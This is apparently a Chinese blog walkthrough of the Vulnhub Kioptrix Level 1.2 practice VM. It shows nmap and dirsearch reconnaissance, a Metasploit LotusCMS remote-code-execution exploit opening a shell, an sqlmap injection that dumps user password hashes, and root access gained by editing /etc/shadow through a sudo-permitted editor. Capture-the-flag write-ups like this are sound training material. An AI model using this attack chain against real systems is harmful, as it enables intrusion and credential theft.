---
title: Vulnhub-Kioptrix Level 1 2
published: 2025-03-09
tags: [Vulnhub]
category: 靶机
draft: false
---

# Kioptrix: Level 1.2

> https://www.vulnhub.com/entry/kioptrix-level-12-3,24/
> 

## 主机发现端口扫描

1. 使用nmap扫描网段类存活主机
    
    因为靶机是我最后添加的，所以靶机IP是`169`
    
    ```php
    nmap -sP 192.168.75.0/24                
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 13:16 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00031s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00029s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.169
    Host is up (0.00052s latency).
    MAC Address: 00:0C:29:D1:B8:48 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00021s latency).
    MAC Address: 00:50:56:EC:C5:A4 (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 扫描主机开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.169
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 13:16 CST
    Nmap scan report for 192.168.75.169
    Host is up (0.0010s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:D1:B8:48 (VMware)
    ```
    
3. 扫描主机服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p22,80 192.168.75.169     
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 13:19 CST
    Nmap scan report for 192.168.75.169
    Host is up (0.00044s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
    80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
    MAC Address: 00:0C:29:D1:B8:48 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6
    OS details: Linux 2.6.9 - 2.6.33
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p22,80 192.168.75.169
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 13:20 CST
    Stats: 0:02:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 98.52% done; ETC: 13:22 (0:00:02 remaining)
    Stats: 0:02:53 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 98.52% done; ETC: 13:23 (0:00:02 remaining)
    Nmap scan report for 192.168.75.169
    Host is up (0.00027s latency).
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    | http-sql-injection: 
    |   Possible sqli for queries:
    |     http://192.168.75.169:80/index.php?page=index%27%20OR%20sqlspider
    |     http://192.168.75.169:80/index.php?page=index%27%20OR%20sqlspider
    |     http://192.168.75.169:80/index.php?system=Admin&page=loginSubmit%27%20OR%20sqlspider
    |     http://192.168.75.169:80/index.php?page=index%27%20OR%20sqlspider
    |     http://192.168.75.169:80/index.php?page=index%27%20OR%20sqlspider
    |     http://192.168.75.169:80/index.php?page=index%27%20OR%20sqlspider
    |     http://192.168.75.169:80/index.php?page=index%27%20OR%20sqlspider
    |     http://192.168.75.169:80/index.php?page=index%27%20OR%20sqlspider
    |     http://192.168.75.169:80/index.php?page=index%27%20OR%20sqlspider
    |     http://192.168.75.169:80/index.php?system=Admin&page=loginSubmit%27%20OR%20sqlspider
    |_    http://192.168.75.169:80/index.php?page=index%27%20OR%20sqlspider
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_      http://ha.ckers.org/slowloris/
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    |_http-trace: TRACE is enabled
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.169
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://192.168.75.169:80/gallery/
    |     Form id: 
    |     Form action: login.php
    |     
    |     Path: http://192.168.75.169:80/index.php?system=Admin
    |     Form id: contactform
    |     Form action: index.php?system=Admin&page=loginSubmit
    |     
    |     Path: http://192.168.75.169:80/gallery/gadmin/
    |     Form id: username
    |     Form action: index.php?task=signin
    |     
    |     Path: http://192.168.75.169:80/gallery/index.php
    |     Form id: 
    |     Form action: login.php
    |     
    |     Path: http://192.168.75.169:80/index.php?system=Blog&post=1281005380
    |     Form id: commentform
    |     Form action: 
    |     
    |     Path: http://192.168.75.169:80/index.php?system=Admin&page=loginSubmit
    |     Form id: contactform
    |_    Form action: index.php?system=Admin&page=loginSubmit
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |   /phpmyadmin/: phpMyAdmin
    |   /cache/: Potentially interesting folder
    |   /core/: Potentially interesting folder
    |   /icons/: Potentially interesting folder w/ directory listing
    |   /modules/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch'
    |_  /style/: Potentially interesting folder
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    MAC Address: 00:0C:29:D1:B8:48 (VMware)
    ```
    

## WEB渗透

1. 访问主页
    
    ![image.png](image%2058.png)
    
2. 扫描目录
    
    ```python
    dirsearch -u 192.168.75.169 -x 403
    //
    [13:31:06] Starting:                                                                                                                                                                                              
    [13:31:27] 301 -  355B  - /cache  ->  http://192.168.75.169/cache/          
    [13:31:31] 301 -  354B  - /core  ->  http://192.168.75.169/core/            
    [13:31:31] 200 -  688B  - /core/fragments/moduleInfo.phtml
    [13:31:36] 200 -   23KB - /favicon.ico                                      
    [13:31:37] 301 -  357B  - /gallery  ->  http://192.168.75.169/gallery/      
    [13:31:47] 301 -  357B  - /modules  ->  http://192.168.75.169/modules/      
    [13:31:47] 200 -    2KB - /modules/                                         
    [13:31:52] 301 -  360B  - /phpmyadmin  ->  http://192.168.75.169/phpmyadmin/
    [13:31:53] 401 -  520B  - /phpmyadmin/scripts/setup.php                     
    [13:31:53] 200 -    8KB - /phpmyadmin/                                      
    [13:31:53] 200 -    8KB - /phpmyadmin/index.php                             
    [13:32:03] 301 -  355B  - /style  ->  http://192.168.75.169/style/          
    [13:32:08] 200 -   18B  - /update.php    
    ```
    
    - `/modules` 像是文件服务器
    - `/phpmyadmin`  phpmyadmin
    - `/update.php` 提示`permission denied.`
    - `index.php?system=Admin` 是登陆页面
3. 登陆页面发现是CMS是`LotusCMS` 查阅有没有可以利用漏洞
    - 看见`ruby`后缀利用文件，上`msf`搜索看看
        
        ```python
        # searchsploit LotusCMS    
        //
        -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
         Exploit Title                                                                                                                                                                  |  Path
        -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
        LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                                                                                                                   | php/remote/18565.rb
        LotusCMS 3.0.3 - Multiple Vulnerabilities                                                                                                                                       | php/webapps/16982.txt
        -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
        ```
        
    - 进入`msf`控制台，进行搜索，应该就是`searchsploit` 搜索出来的那个
        
        ```python
        msf6 > search LotusCMS
        
        Matching Modules
        ================
        
           #  Name                              Disclosure Date  Rank       Check  Description
           -  ----                              ---------------  ----       -----  -----------
           0  exploit/multi/http/lcms_php_exec  2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution
        ```
        
    - 尝试利用
        
        ```python
        msf6 > use exploit/multi/http/lcms_php_exec 
        msf6 exploit(multi/http/lcms_php_exec) > set rhosts 192.168.75.169
        rhosts => 192.168.75.169
        msf6 exploit(multi/http/lcms_php_exec) > set uri /index.php?system=Admin
        uri => /index.php?system=Admin
        msf6 exploit(multi/http/lcms_php_exec) > run
        [*] Started reverse TCP handler on 192.168.75.151:4444 
        [*] Using found page param: /index.php?page=index
        [*] Sending exploit ...
        [*] Exploit completed, but no session was created.
        ```
        
        死活不成功，尝试换一下`payload`
        
        ```python
        msf6 exploit(multi/http/lcms_php_exec) > set payload php/reverse_php 
        payload => php/reverse_php
        ```
        
        尝试了几个`payload`后发现`php/bind_perl` 可以使用
        
        ```python
        msf6 exploit(multi/http/lcms_php_exec) > set payload php/reverse_perl 
        payload => php/reverse_perl
        msf6 exploit(multi/http/lcms_php_exec) > run
        
        [*] Started reverse TCP handler on 192.168.75.151:4444 
        [*] Using found page param: /index.php?page=index
        [*] Sending exploit ...
        [*] Exploit completed, but no session was created.
        msf6 exploit(multi/http/lcms_php_exec) > set payload php/bind_perl
        payload => php/bind_perl
        msf6 exploit(multi/http/lcms_php_exec) > run
        
        [*] Using found page param: /index.php?page=index
        [*] Sending exploit ...
        [*] Started bind TCP handler against 192.168.75.169:4444
        [*] Command shell session 1 opened (192.168.75.151:34319 -> 192.168.75.169:4444) at 2024-10-29 14:08:36 +0800
        whoami
        www-data
        ```
        

## 提权

1. 查看权限
    
    ```python
    python -c "import pty;pty.spawn('/bin/sh')"
    //
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    //
    $ uname -a
    Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
    //
    $ whoami
    www-data
    ```
    
2. 寻找突破口
    - suid提权寻找
        
        ```python
        $ find / -perm -u=s -type f 2>/dev/null
        /usr/lib/eject/dmcrypt-get-device
        /usr/lib/openssh/ssh-keysign
        /usr/lib/apache2/suexec
        /usr/lib/pt_chown
        /usr/bin/arping
        /usr/bin/mtr
        /usr/bin/newgrp
        /usr/bin/chfn
        /usr/bin/gpasswd
        /usr/bin/sudo
        /usr/bin/at
        /usr/bin/sudoedit
        /usr/bin/chsh
        /usr/bin/passwd
        /usr/bin/traceroute6.iputils
        /usr/local/bin/ht
        /usr/sbin/pppd
        /usr/sbin/uuidd
        /lib/dhcp3-client/call-dhclient-script
        /bin/fusermount
        /bin/ping
        /bin/mount
        /bin/umount
        /bin/ping6
        /bin/su
        ```
        
    - `/etc/phpmyadmin`下`config.inc.php`存在数据库账号密码，尝试但是登陆失败
        
        ```python
        // $cfg['Servers'][$i]['controluser'] = 'pma';
        // $cfg['Servers'][$i]['controlpass'] = 'pmapass';
        ```
        
    - 寻找敏感文件，在`/home/loneferret` 存在一个`CompanyPolicy.README` 文件
        
        ```python
        # CompanyPolicy.README
        Hello new employee,
        It is company policy here to use our newly installed software for editing, creating and viewing files.
        Please use the command 'sudo ht'.
        Failure to do so will result in you immediate termination.
        
        DG
        CEO
        ```
        
        但是`sudo ht`需要密码，继续寻找别的方法
        

## web渗透 2

1. 才知道我的靶机有问题，访问`gallery/` 会加载不完全，被浏览器自动拦截了很多内容。
    
    ![image.png](image%2059.png)
    
2. 取消拦截后就好了
3. 发现 `http://kioptrix3.com/gallery/gallery.php?id=1` 有个可能存在sql注入的地方，使用`sqlmap`检测是否存在sql注入
    
    ```python
    # 结果
    [19:07:04] [INFO] the back-end DBMS is MySQL
    web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
    web application technology: PHP 5.2.4, Apache 2.2.8, PHP
    back-end DBMS: MySQL >= 5.0.12
    [19:07:05] [WARNING] HTTP error codes detected during run:
    500 (Internal Server Error) - 23 times
    [19:07:05] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/kioptrix3.com'
    ```
    
    存在sql注入，继续使用`sqlmap`来爆破剩余的数据
    
    最后`dump`下两行数据，是两个用户
    
    ```python
    +----+---------------------------------------------+------------+
    | id | password                                    | username   |
    +----+---------------------------------------------+------------+
    | 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |
    | 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |
    +----+---------------------------------------------+------------+
    ```
    
4. 使用爆破出来的用户去尝试登陆 ssh，`loneferret`成功登入

## 提权 2

1. 查看权限
    
    ```python
    loneferret@Kioptrix3:~$ sudo -l
    User loneferret may run the following commands on this host:
        (root) NOPASSWD: !/usr/bin/su
    	    (root) NOPASSWD: /usr/local/bin/ht
    ```
    
    `ht`拥有`sudo`权限，根据之前发现的内容知道ht可以编辑文件，并且拥有`sudo`权限
    
2. 尝试修改`shadow`文件
    
    ```python
    loneferret@Kioptrix3:~$ sudo ht /etc/shadow
    Error opening terminal: xterm-256color.
    ```
    
    报错了：`Error opening terminal: xterm-256color.` ，需要加上
    
    ```python
    export TERM=xterm
    ```
    
3. 直接将当前用户的密码覆盖到`root`上去，`F3`好像是编辑，`F2`保存，`ctrl + c`退出
    
    ![image.png](image%2060.png)
    
4. 然后`ssh`登录`root`账户，提权成功
    
    ```python
    loneferret@Kioptrix3:~$ su root
    Password:                                                                                                                                                                                                         
    root@Kioptrix3:/home/loneferret# 
    ```
    
    读取flag文件
    
    ```python
    root@Kioptrix3:~# cat Congrats.txt 
    //
    Good for you for getting here.                                                                                                                                                                                    
    Regardless of the matter (staying within the spirit of the game of course)                                                                                                                                        
    you got here, congratulations are in order. Wasn't that bad now was it.                                                                                                                                           
                                                                                                                                                                                                                      
    Went in a different direction with this VM. Exploit based challenges are
    nice. Helps workout that information gathering part, but sometimes we
    need to get our hands dirty in other things as well.
    Again, these VMs are beginner and not intented for everyone. 
    Difficulty is relative, keep that in mind.
    
    The object is to learn, do some research and have a little (legal)
    fun in the process.
    
    I hope you enjoyed this third challenge.
    
    Steven McElrea
    aka loneferret
    http://www.kioptrix.com
    
    Credit needs to be given to the creators of the gallery webapp and CMS used
    for the building of the Kioptrix VM3 site.
    
    Main page CMS: 
    http://www.lotuscms.org
    
    Gallery application: 
    Gallarific 2.1 - Free Version released October 10, 2009
    http://www.gallarific.com
    Vulnerable version of this application can be downloaded
    from the Exploit-DB website:
    http://www.exploit-db.com/exploits/15891/
    
    The HT Editor can be found here:
    http://hte.sourceforge.net/downloads.html
    And the vulnerable version on Exploit-DB here:
    http://www.exploit-db.com/exploits/17083/
    
    Also, all pictures were taken from Google Images, so being part of the
    public domain I used them.
    
    root@Kioptrix3:~# 
    
    ```